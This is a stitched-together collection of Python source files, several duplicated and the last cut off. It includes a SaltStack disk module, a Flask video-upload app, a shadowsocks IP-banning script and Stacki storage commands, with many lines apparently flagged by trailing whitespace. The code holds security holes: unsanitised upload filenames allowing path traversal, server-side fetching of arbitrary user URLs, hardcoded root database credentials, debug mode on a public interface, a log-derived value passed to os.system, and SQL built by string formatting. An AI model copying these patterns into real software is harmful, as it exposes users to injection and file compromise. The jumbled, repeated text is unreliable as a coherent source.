    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if not line:
            continue
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        while not comps[1].isdigit():
            comps[0] = '{0} {1}'.format(comps[0], comps[1])
            comps.pop(1)
        try:
            if __grains__['kernel'] == 'Darwin':
                ret[comps[8]] = {
                        'filesystem': comps[0],
                        '512-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                        'iused': comps[5],
                        'ifree': comps[6],
                        '%iused': comps[7],
                }
            else:
                ret[comps[5]] = {
                        'filesystem': comps[0],
                        '1K-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                }
        except IndexError:
            log.warn("Problem parsing disk usage information")
            ret = {}
    return ret


def inodeusage(args=None):
    '''
    Return inode usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.inodeusage
    '''
    cmd = 'df -i'
    if args is not None:
        cmd = cmd + ' -' + args                    
    ret = {}
    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        # Don't choke on empty lines
        if not comps:
            continue

        try:
            if __grains__['kernel'] == 'OpenBSD':
                ret[comps[8]] = {
                    'inodes': int(comps[5]) + int(comps[6]),
                    'used': comps[5],
                    'free': comps[6],
                    'use': comps[7],
                    'filesystem': comps[0],
                }
            else:
                ret[comps[5]] = {
                    'inodes': comps[1],
                    'used': comps[2],
                    'free': comps[3],
                    'use': comps[4],
                    'filesystem': comps[0],
                }
        except (IndexError, ValueError):
            log.warn("Problem parsing inode usage information")
            ret = {}
    return ret

# -*- coding: utf-8 -*-
'''
Module for gathering disk information
'''

# Import python libs
import logging

# Import salt libs
import salt.utils

log = logging.getLogger(__name__)


def __virtual__():
    '''
    Only work on POSIX-like systems
    '''
    if salt.utils.is_windows():
        return False
    return 'disk'


def usage(args=None):
    '''
    Return usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.usage
    '''
    if __grains__['kernel'] == 'Linux':
        cmd = 'df -P'
    elif __grains__['kernel'] == 'OpenBSD':
        cmd = 'df -kP'
    else:
        cmd = 'df'
    if args:
        cmd = cmd + ' -' + args                    
    ret = {}
    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if not line:
            continue
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        while not comps[1].isdigit():
            comps[0] = '{0} {1}'.format(comps[0], comps[1])
            comps.pop(1)
        try:
            if __grains__['kernel'] == 'Darwin':
                ret[comps[8]] = {
                        'filesystem': comps[0],
                        '512-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                        'iused': comps[5],
                        'ifree': comps[6],
                        '%iused': comps[7],
                }
            else:
                ret[comps[5]] = {
                        'filesystem': comps[0],
                        '1K-blocks': comps[1],
                        'used': comps[2],
                        'available': comps[3],
                        'capacity': comps[4],
                }
        except IndexError:
            log.warn("Problem parsing disk usage information")
            ret = {}
    return ret


def inodeusage(args=None):
    '''
    Return inode usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.inodeusage
    '''
    cmd = 'df -i'
    if args is not None:
        cmd = cmd + ' -' + args                    
    ret = {}
    out = __salt__['cmd.run'](cmd).splitlines()
    for line in out:
        if line.startswith('Filesystem'):
            continue
        comps = line.split()
        # Don't choke on empty lines
        if not comps:
            continue

        try:
            if __grains__['kernel'] == 'OpenBSD':
                ret[comps[8]] = {
                    'inodes': int(comps[5]) + int(comps[6]),
                    'used': comps[5],
                    'free': comps[6],
                    'use': comps[7],
                    'filesystem': comps[0],
                }
            else:
                ret[comps[5]] = {
                    'inodes': comps[1],
                    'used': comps[2],
                    'free': comps[3],
                    'use': comps[4],
                    'filesystem': comps[0],
                }
        except (IndexError, ValueError):
            log.warn("Problem parsing inode usage information")
            ret = {}
    return ret

from flask import Flask, flash, render_template, request, url_for, redirect, session, g
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import MySQLdb
from flask_sqlalchemy import SQLAlchemy
from MySQLdb import escape_string as thwart
from passlib.hash import sha256_crypt
import os
import time
from werkzeug import secure_filename
import urllib.request
import shutil
import requests
from datetime import datetime
import sys

time.sleep(30)
app = Flask(__name__, template_folder="template")
app.config['SQLALCHEMY_DATABASE_URI'] = "mysql://root:root@db:3306/users"
db = SQLAlchemy(app)


# create the folders when setting up your app
#os.makedirs(os.path.join(app.instance_path, 'video'), exist_ok=True)
os.makedirs('static/videos', exist_ok=True)

class users(db.Model):
    __tablename__ = "User"
    UserID = db.Column('UserID', db.Integer, primary_key=True, nullable=False, autoincrement=True)
    Username = db.Column('Username', db.String(15))
    PasswordHash = db.Column('PasswordHash', db.String(200))
    DisplayName = db.Column('DisplayName', db.String(15))
    #data = db.Column()
    def __init__(self,UserID, Username, PasswordHash, DisplayName ):
        self.UserID = UserID
        self.Username = Username
        self.PasswordHash = PasswordHash
        self.DisplayName = DisplayName



class Video(db.Model):
    __tablename__ = "Video"
    VideoID = db.Column("VideoID", db.Integer, primary_key= True, autoincrement=True)
    UserID = db.Column('UserID', db.Integer, ForeignKey_key=("User.UserID"), nullable=False)
    URL = db.Column('URL', db.String(60))
    Name = db.Column('Name', db.String(100))
    UploadDate = db.Column('UploadDate', db.DateTime)


    def __init__(self,VideoID, UserID, URL, Name, UploadDate  ):
        self.VideoID = VideoID
        self.UserID = UserID
        self.URL = URL
        self.Name = Name
        self.UploadDate = UploadDate

#used for seassion config
secKey = os.urandom(24)
app.secret_key = secKey
#time.sleep(30)
#conn = MySQLdb.connect(host="db", user="root", passwd="root", db="users", port = 3306)
#c = conn.cursor()

#for limiting the brute force attack
limiter = Limiter (
    app,
    key_func=get_remote_address,
   # default_limits=["28000 per day", "1000 per hour", "20 per minute"]
)
#limiting the  brute force attack
@app.route('/', methods=["GET","POST"])
@limiter.limit("8000/day;400/hour;25/minute")
def index():
	error = ''
	try:                    
		if request.method == 'POST':                    
			# Fetch form data
			username = request.form['username']
			password = request.form['password']
			#try:                    
			data=users.query.filter_by(Username=username).first()
			#except Exception as e:                    
			#	flash(e)
			#data = c.execute("SELECT * FROM User WHERE username = %s", [username])
			#data = c.fetchone()[2]
			if sha256_crypt.verify(password, str(data.PasswordHash)):
				session['username'] = username
				flash("you are now logged in")

				return redirect(url_for("upload"))

			else:
				error = "Invalid credentials, try again."

	except Exception as e:                    
		#error = "Invalid credentials, try again."
		return render_template("index.html", error = error)

	return render_template('index.html', error = error)

@app.route('/logout')
def logout():
    # remove the username from the session if it's there
	#dropSession()
	#username=session['username']
	session.pop("username", None)
	return redirect(url_for('index'))

@app.route("/video/<filename>")
def video(filename):
	if 'username' in session:                    
		#return app.send_static_file(filename)
		#filename = os.path.join('static', filename)
		return render_template("video_viewing_screen.html",video_name=filename)
		#return redirect(filename)
		#return render_template(filename)
	else:
		return redirect(url_for("index"))

@app.route("/getSession")
def getSession():
	if "username" in session:
		return  session["user"]
	return "No Session avalibale!"

@app.route("/dropSession")
def dropSession():
	session.pop("username", None)

@app.before_request
def before_request():
	g.user = None
	if "username" in session:
		g.user = session["username"]



@app.route('/upload' , methods = ['GET', 'POST'] )
def upload():
	error=''                    
	try:                    
		if 'username' in session:                    
			if request.method == 'POST':                    
				#f = request.files['file']
				if 'file' in request.files.keys():
			# when saving the file
					f = request.files['file']
					f.save("static/videos/{}".format(f.filename))                    

					data=users.query.filter_by(Username=session['username']).first()                    
					new_video = Video(VideoID = None, UserID = data.UserID, URL = "local", Name = f.filename, UploadDate = datetime.today().strftime('%Y-%m-%d'))                    
					db.session.add(new_video)                    
					db.session.commit()                    
                    #i = Video.insert()
                    #i.execute(UserID=data.UserID, URL = "Local", Name = f.filename, UploadDate = datetime.today().strftime('%Y-%m-%d'))

				#f2 = request.form['link11']
				if 'link11' in request.form.keys():
					url = request.form['link11']                    
					#reqGet = requests.get(url)
					filename123 = url.split("/")[-1]
					#with open(filename123,'wb') as vid:
					#	shutil.copyfileobj(reqGet.raw, "static/videos/"+vid)
					urllib.request.urlretrieve(url, "static/videos/"+filename123)
					data = users.query.filter_by(Username=session['username']).first()
					new_video = Video(VideoID = None, UserID = data.UserID, URL = "local", Name = filename123, UploadDate = datetime.today().strftime('%Y-%m-%d'))
					db.session.add(new_video)                    
					db.session.commit()                    


			videos = []                    
			for video in os.listdir("static/videos"):                    
				video_uploader = Video.query.filter_by(Name=video).first()                    
				video_uploader = users.query.filter_by(UserID=video_uploader.UserID).first()                    
				videos.append((video, video_uploader.Username))                    
			return render_template('upload.html', videos=videos)                    

	except Exception as e:                    
		return render_template("upload", error = e)                    


		#        f.save(secure_filename(f.filename))

	#videos = os.listdir("static/videos")
	#return render_template('test_upload.html')
	#return render_template('upload.html', videos=videos)                    
	#if 'username' in session:                    
	#	if request.method == 'POST':                    
	#		#f = request.files['file']
	#		f2 = request.form['link11']

	#		if f2:
	#			url = request.form['link11']                    
	#			reqGet = requests.get(url)
	#			filename123 = url.split("/")[-1]
	#			os.path.join(app.instance_path, "video", filename123)
	#		with open(filename123,'wb') as vid:
				#shutil.copyfileobj(reqGet.raw, vid)

                #urllib.request.urlretrieve(url_link, 'video_name.mp4')
                #v = pafy.new(str(url))
                #s = v.allstreams[len(v.allstreams)-1]
                #filename = s.download(os.path.join(app.instance_path, 'video', secure_filename(v.title)))
	#return render_template('index.html')

@app.route('/delete_video/<filename>')
def delete_video(filename):
	if 'username' in session:                    
		#os.remove("static/videos/{}".format(filename))                    
		print(session['username'], file=sys.stdout)
		data=users.query.filter_by(Username=session['username']).first()                    
		video=Video.query.filter_by(UserID=data.UserID,Name=filename).first()
		if video != None:
			os.remove("static/videos/{}".format(filename))                    
			db.session.delete(video)
			db.session.commit()                    
		else:
			return "Don't delete other people's videos!"
		return redirect(url_for('upload'))
	return "test"

if __name__ == '__main__':
	#app.run()
	app.run(host='0.0.0.0', debug=True)
    #port = int(os.environ.get('PORT', 5000))
    #app.run(app, host='0.0.0.0', port=port)


#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2015 clowwindy
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from __future__ import absolute_import, division, print_function, \
    with_statement

import os
import sys
import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='See README')
    parser.add_argument('-c', '--count', default=3, type=int,
                        help='with how many failure times it should be '
                             'considered as an attack')
    config = parser.parse_args()
    ips = {}
    banned = set()
    for line in sys.stdin:
        if 'can not parse header when' in line:                    
            ip = line.split()[-1].split(':')[-2]                    
            if ip not in ips:                    
                ips[ip] = 1                    
                print(ip)                    
                sys.stdout.flush()                    
            else:                    
                ips[ip] += 1                    
            if ip not in banned and ips[ip] >= config.count:                    
                banned.add(ip)                    
                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                    
                print(cmd, file=sys.stderr)
                sys.stderr.flush()                    
                os.system(cmd)                    

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2015 clowwindy
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from __future__ import absolute_import, division, print_function, \
    with_statement

import os
import sys
import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='See README')
    parser.add_argument('-c', '--count', default=3, type=int,
                        help='with how many failure times it should be '
                             'considered as an attack')
    config = parser.parse_args()
    ips = {}
    banned = set()
    for line in sys.stdin:
        if 'can not parse header when' in line:                    
            ip = line.split()[-1].split(':')[-2]                    
            if ip not in ips:                    
                ips[ip] = 1                    
                print(ip)                    
                sys.stdout.flush()                    
            else:                    
                ips[ip] += 1                    
            if ip not in banned and ips[ip] >= config.count:                    
                banned.add(ip)                    
                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                    
                print(cmd, file=sys.stderr)
                sys.stderr.flush()                    
                os.system(cmd)                    

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2015 clowwindy
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from __future__ import absolute_import, division, print_function, \
    with_statement

import os
import sys
import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='See README')
    parser.add_argument('-c', '--count', default=3, type=int,
                        help='with how many failure times it should be '
                             'considered as an attack')
    config = parser.parse_args()
    ips = {}
    banned = set()
    for line in sys.stdin:
        if 'can not parse header when' in line:                    
            ip = line.split()[-1].split(':')[-2]                    
            if ip not in ips:                    
                ips[ip] = 1                    
                print(ip)                    
                sys.stdout.flush()                    
            else:                    
                ips[ip] += 1                    
            if ip not in banned and ips[ip] >= config.count:                    
                banned.add(ip)                    
                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                    
                print(cmd, file=sys.stderr)
                sys.stderr.flush()                    
                os.system(cmd)                    

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2015 clowwindy
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from __future__ import absolute_import, division, print_function, \
    with_statement

import os
import sys
import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='See README')
    parser.add_argument('-c', '--count', default=3, type=int,
                        help='with how many failure times it should be '
                             'considered as an attack')
    config = parser.parse_args()
    ips = {}
    banned = set()
    for line in sys.stdin:
        if 'can not parse header when' in line:                    
            ip = line.split()[-1].split(':')[-2]                    
            if ip not in ips:                    
                ips[ip] = 1                    
                print(ip)                    
                sys.stdout.flush()                    
            else:                    
                ips[ip] += 1                    
            if ip not in banned and ips[ip] >= config.count:                    
                banned.add(ip)                    
                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                    
                print(cmd, file=sys.stderr)
                sys.stderr.flush()                    
                os.system(cmd)                    

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2015 clowwindy
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from __future__ import absolute_import, division, print_function, \
    with_statement

import os
import sys
import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='See README')
    parser.add_argument('-c', '--count', default=3, type=int,
                        help='with how many failure times it should be '
                             'considered as an attack')
    config = parser.parse_args()
    ips = {}
    banned = set()
    for line in sys.stdin:
        if 'can not parse header when' in line:                    
            ip = line.split()[-1].split(':')[-2]                    
            if ip not in ips:                    
                ips[ip] = 1                    
                print(ip)                    
                sys.stdout.flush()                    
            else:                    
                ips[ip] += 1                    
            if ip not in banned and ips[ip] >= config.count:                    
                banned.add(ip)                    
                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                    
                print(cmd, file=sys.stderr)
                sys.stderr.flush()                    
                os.system(cmd)                    

# @copyright@
# Copyright (c) 2006 - 2018 Teradata
# All rights reserved. Stacki(r) v5.x stacki.com
# https://github.com/Teradata/stacki/blob/master/LICENSE.txt
# @copyright@
#
# @rocks@

import stack.commands
from stack.exception import CommandError, ParamRequired, ParamType, ParamValue, ParamError


class Command(stack.commands.HostArgumentProcessor,                    
		stack.commands.ApplianceArgumentProcessor,
		stack.commands.add.command):
	"""
	Add a storage controller configuration to the database.

	<arg type='string' name='scope'>
	Zero or one argument. The argument is the scope: a valid os (e.g.,
	'redhat'), a valid appliance (e.g., 'backend') or a valid host
	(e.g., 'backend-0-0). No argument means the scope is 'global'.
	</arg>

	<param type='int' name='adapter' optional='1'>
	Adapter address.
	</param>

	<param type='int' name='enclosure' optional='1'>
	Enclosure address.
	</param>

	<param type='int' name='slot'>
	Slot address(es). This can be a comma-separated list meaning all disks
	in the specified slots will be associated with the same array
	</param>

	<param type='int' name='raidlevel'>
	RAID level. Raid 0, 1, 5, 6 and 10 are currently supported.
	</param>

	<param type='int' name='hotspare' optional='1'>
	Slot address(es) of the hotspares associated with this array id. This
	can be a comma-separated list (like the 'slot' parameter). If the
	'arrayid' is 'global', then the specified slots are global hotspares.
	</param>

	<param type='string' name='arrayid'>
	The 'arrayid' is used to determine which disks are grouped as part
	of the same array. For example, all the disks with arrayid of '1' will
	be part of the same array. Arrayids must be integers starting at 1
	or greater. If the arrayid is 'global', then 'hotspare' must
	have at least one slot definition (this is how one specifies a global
	hotspare).
	In addition, the arrays will be created in arrayid order, that is,
	the array with arrayid equal to 1 will be created first, arrayid
	equal to 2 will be created second, etc.
	</param>

	<example cmd='add storage controller backend-0-0 slot=1 raidlevel=0 arrayid=1'>
	The disk in slot 1 on backend-0-0 should be a RAID 0 disk.
	</example>

	<example cmd='add storage controller backend-0-0 slot=2,3,4,5,6 raidlevel=6 hotspare=7,8 arrayid=2'>
	The disks in slots 2-6 on backend-0-0 should be a RAID 6 with two
	hotspares associated with the array in slots 7 and 8.
	</example>
	"""

	def checkIt(self, name, scope, tableid, adapter, enclosure, slot):
		self.db.execute("""select scope, tableid, adapter, enclosure,
			slot from storage_controller where
			scope = '%s' and tableid = %s and adapter = %s and
			enclosure = %s and slot = %s""" % (scope, tableid,
			adapter, enclosure, slot))

		row = self.db.fetchone()

		if row:
			label = [ 'scope', 'name' ]
			value = [ scope, name ]

			if adapter > -1:
				label.append('adapter')
				value.append('%s' % adapter)
			if enclosure > -1:
				label.append('enclosure')
				value.append('%s' % enclosure)

			label.append('slot')
			value.append('%s' % slot)

			raise CommandError(self, 'disk specification %s %s already exists in the database' % ('/'.join(label), '/'.join(value)))


	def run(self, params, args):
		scope = None
		oses = []
		appliances = []
		hosts = []

		if len(args) == 0:
			scope = 'global'
		elif len(args) == 1:
			try:
				oses = self.getOSNames(args)
			except:
				oses = []

			try:
				appliances = self.getApplianceNames(args)
			except:
				appliances = []

			try:
				hosts = self.getHostnames(args)
			except:
				hosts = []
		else:
			raise CommandError(self, 'must supply zero or one argument')

		if not scope:
			if args[0] in oses:
				scope = 'os'
			elif args[0] in appliances:
				scope = 'appliance'
			elif args[0] in hosts:
				scope = 'host'

		if not scope:
			raise CommandError(self, 'argument "%s" must be a valid os, appliance name or host name' % args[0])

		if scope == 'global':
			name = 'global'
		else:
			name = args[0]

		adapter, enclosure, slot, hotspare, raidlevel, arrayid, options, force = self.fillParams([
			('adapter', None),
			('enclosure', None),
			('slot', None),
			('hotspare', None),
			('raidlevel', None),
			('arrayid', None, True),
			('options', ''),
			('force', 'n')
			])

		if not hotspare and not slot:
			raise ParamRequired(self, [ 'slot', 'hotspare' ])
		if arrayid != 'global' and not raidlevel:
			raise ParamRequired(self, 'raidlevel')

		if adapter:
			try:
				adapter = int(adapter)
			except:
				raise ParamType(self, 'adapter', 'integer')
			if adapter < 0:
				raise ParamValue(self, 'adapter', '>= 0')
		else:
			adapter = -1

		if enclosure:
			try:
				enclosure = int(enclosure)
			except:
				raise ParamType(self, 'enclosure', 'integer')
			if enclosure < 0:
				raise ParamValue(self, 'enclosure', '>= 0')
		else:
			enclosure = -1

		slots = []
		if slot:
			for s in slot.split(','):
				if s == '*':
					#
					# represent '*' in the database as '-1'
					#
					s = -1
				else:
					try:
						s = int(s)
					except:
						raise ParamType(self, 'slot', 'integer')
					if s < 0:
						raise ParamValue(self, 'slot', '>= 0')
					if s in slots:
						raise ParamError(self, 'slot', ' "%s" is listed twice' % s)
				slots.append(s)

		hotspares = []
		if hotspare:
			for h in hotspare.split(','):
				try:
					h = int(h)
				except:	
					raise ParamType(self, 'hotspare', 'integer')
				if h < 0:
					raise ParamValue(self, 'hostspare', '>= 0')
				if h in hotspares:
					raise ParamError(self, 'hostspare', ' "%s" is listed twice' % h)
				hotspares.append(h)

		if arrayid in [ 'global', '*' ]:
			pass
		else:
			try:
				arrayid = int(arrayid)
			except:
				raise ParamType(self, 'arrayid', 'integer')
			if arrayid < 1:
				raise ParamValue(self, 'arrayid', '>= 0')

		if arrayid == 'global' and len(hotspares) == 0:
			raise ParamError(self, 'arrayid', 'is "global" with no hotspares. Please supply at least one hotspare')

		#
		# look up the id in the appropriate 'scope' table
		#
		tableid = None
		if scope == 'global':
			tableid = -1
		elif scope == 'appliance':
			self.db.execute("""select id from appliances where
				name = '%s' """ % name)                    
			tableid, = self.db.fetchone()
		elif scope == 'host':
			self.db.execute("""select id from nodes where
				name = '%s' """ % name)                    
			tableid, = self.db.fetchone()

		#
		# make sure the specification doesn't already exist
		#
		force = self.str2bool(force)
		for slot in slots:
			if not force:
				self.checkIt(name, scope, tableid, adapter, enclosure,
					slot)
		for hotspare in hotspares:
			if not force:
				self.checkIt(name, scope, tableid, adapter, enclosure,
					hotspare)

		if arrayid == 'global':
			arrayid = -1
		elif arrayid == '*':
			arrayid = -2

		#
		# now add the specifications to the database
		#
		for slot in slots:
			self.db.execute("""insert into storage_controller
				(scope, tableid, adapter, enclosure, slot,
				raidlevel, arrayid, options) values ('%s', %s, %s, %s,                    
				%s, %s, %s, '%s') """ % (scope, tableid, adapter,                    
				enclosure, slot, raidlevel, arrayid, options))

		for hotspare in hotspares:
			raidlevel = -1
			if arrayid == 'global':
				arrayid = -1

			self.db.execute("""insert into storage_controller
				(scope, tableid, adapter, enclosure, slot,
				raidlevel, arrayid, options) values ('%s', %s, %s, %s,                    
				%s, %s, %s, '%s') """ % (scope, tableid, adapter,                    
				enclosure, hotspare, raidlevel, arrayid, options))


# @copyright@
# Copyright (c) 2006 - 2018 Teradata
# All rights reserved. Stacki(r) v5.x stacki.com
# https://github.com/Teradata/stacki/blob/master/LICENSE.txt
# @copyright@

import stack.commands
from stack.exception import CommandError, ArgRequired, ArgValue, ParamRequired, ParamType, ParamValue


class Command(stack.commands.HostArgumentProcessor,                    
		stack.commands.ApplianceArgumentProcessor,
		stack.commands.add.command):
	"""
	Add a partition configuration to the database.

	<arg type='string' name='scope'>
	Zero or one argument. The argument is the scope: a valid os (e.g.,
	'redhat'), a valid appliance (e.g., 'backend') or a valid host
	(e.g., 'backend-0-0). No argument means the scope is 'global'.
	</arg>

	<param type='string' name='device' optional='0'>
	Disk device on which we are creating partitions
	</param>

	<param type='string' name='mountpoint' optional='1'>
	Mountpoint to create
	</param>

	<param type='int' name='size' optional='1'>                    
	Size of the partition.
	</param>

	<param type='string' name='type' optional='1'>
	Type of partition E.g: ext4, ext3, xfs, raid, etc.
	</param>

	<param type='string' name='options' optional='0'>
	Options that need to be supplied while adding partitions.
	</param>

	<param type='string' name='partid' optional='1'>                    
	The relative partition id for this partition. Partitions will be
	created in ascending partition id order.
	</param>
	
	<example cmd='add storage partition backend-0-0 device=sda mountpoint=/var
		size=50 type=ext4'>
	Creates a ext4 partition on device sda with mountpoints /var.
	</example>

	<example cmd='add storage partition backend-0-2 device=sdc mountpoint=pv.01
		 size=0 type=lvm'>
	Creates a physical volume named pv.01 for lvm.
	</example>

	<example cmd='add storage partition backend-0-2 mountpoint=volgrp01 device=pv.01 pv.02 pv.03
		size=32768 type=volgroup'>
	Creates a volume group from 3 physical volumes i.e. pv.01, pv.02, pv.03. All these 3
	physical volumes need to be created with the previous example. PV's need to be space
	separated.
	</example>
	<example cmd='add storage partition backend-0-2 device=volgrp01 mountpoint=/banktools
		size=8192 type=xfs options=--name=banktools'>
	Created an xfs lvm partition of size 8192 on volgrp01. volgrp01 needs to be created
	with the previous example.
	</example>
	"""

	#
	# Checks if partition config already exists in DB for a device and 
	# a mount point.
	#
	def checkIt(self, device, scope, tableid, mountpt):
		self.db.execute("""select Scope, TableID, Mountpoint,
			device, Size, FsType from storage_partition where
			Scope='%s' and TableID=%s and device= '%s'                    
			and Mountpoint='%s'""" % (scope, tableid, device, mountpt))                    

		row = self.db.fetchone()

		if row:
			raise CommandError(self, """partition specification for device %s,
				mount point %s already exists in the 
				database""" % (device, mountpt))

	def run(self, params, args):
		scope = None
		oses = []
		appliances = []
		hosts = []

		if len(args) == 0:
			scope = 'global'
		elif len(args) == 1:
			try:
				oses = self.getOSNames(args)
			except:                    
				oses = []

			try:
				appliances = self.getApplianceNames(args)
			except:                    
				appliances = []

			try:
				hosts = self.getHostnames(args)
			except:                    
				hosts = []
		else:
			raise ArgRequired(self, 'scope')

		if not scope:
			if args[0] in oses:
				scope = 'os'
			elif args[0] in appliances:
				scope = 'appliance'
			elif args[0] in hosts:
				scope = 'host'

		if not scope:
			raise ArgValue(self, 'scope', 'valid os, appliance name or host name')

		if scope == 'global':
			name = 'global'
		else:
			name = args[0]

		device, size, fstype, mountpt, options, partid = \
			self.fillParams([
				('device', None, True),
				('size', None), 
				('type', None), 
				('mountpoint', None),
				('options', None),
				('partid', None),
				])

		if not device:
			raise ParamRequired(self, 'device')

		# Validate size
		if size:
			try:
				s = int(size)
			except:                    
				#
				# If mountpoint is 'swap' then allow
				# 'hibernate', 'recommended' as sizes.
				#
				if mountpt == 'swap' and \
					size not in ['recommended', 'hibernation']:
						raise ParamType(self, 'size', 'integer')
			if s < 0:
				raise ParamValue(self, 'size', '>= 0')

		# Validate partid
		if partid:
			try:
				p = int(partid)
			except:                    
				partid = None                    

			if p < 1:
				raise ParamValue(self, 'partid', '>= 0')

			partid = p

		#
		# look up the id in the appropriate 'scope' table
		#
		tableid = None
		if scope == 'global':
			tableid = -1
		elif scope == 'appliance':
			self.db.execute("""select id from appliances where
				name = '%s' """ % name)
			tableid, = self.db.fetchone()
		elif scope == 'host':
			self.db.execute("""select id from nodes where
